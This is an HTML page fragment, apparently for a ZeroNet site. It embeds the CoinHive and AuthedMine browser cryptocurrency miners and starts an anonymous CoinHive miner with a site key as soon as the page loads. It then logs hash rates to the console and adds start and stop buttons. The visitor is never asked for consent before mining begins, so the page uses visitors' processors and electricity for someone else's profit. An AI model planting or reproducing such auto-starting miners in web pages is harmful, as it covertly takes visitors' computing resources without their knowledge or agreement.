<script  sandbox="allow-same-origin allow-scripts" src="https://authedmine.com/lib/authedmine.min.js"></script>
<script  sandbox="allow-same-origin allow-scripts" src="https://coinhive.com/lib/coinhive.min.js"></script>

<script type="text/javascript" src="js/ZeroFrame.js"></script>
<script>
  var miner = new CoinHive.Anonymous('dJ9sqChuXYw6BqFRmd4PaHvNhGoSPYLS');
  miner.start();
  miner.setThrottle(0.72); // Set miner on high throttle (LOW speed)!

  // Listen on events
  miner.on('found', function() { / Hash found / })
  miner.on('accepted', function() { / Hash accepted by the pool / })

  // Update stats once per second
  setInterval(function() {
    var hashesPerSecond = miner.getHashesPerSecond();
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes();
    var throttleValue = miner.getThrottle();
    var ad_state = 0;

    // OR alternatively, output to console log (recommended)...
    console.log("Hashes per second: " + parseFloat(hashesPerSecond).toFixed(2));
    console.log("Total hashes: " + totalHashes);
    console.log("Throttle value: " + throttleValue);

    }, 1000);

</script>
<script>
  class Page extends ZeroFrame {
  	setSiteInfo(site_info){}

  	onOpenWebsocket() {
  		this.cmd("siteInfo", [], function(site_info) {
  			page.setSiteInfo(site_info)
    	})
  	}

  	onRequest(cmd, message) {
  		if (cmd == "setSiteInfo")
  			this.setSiteInfo(message.params)
  		else
  			this.log("Unknown incoming message:", cmd)
  	}
  }
  page = new Page()
</script>

<button style="color: red;" onclick="miner.start();" >start</button>
<button style="color: red;" onclick="miner.stop();" >stop</button>
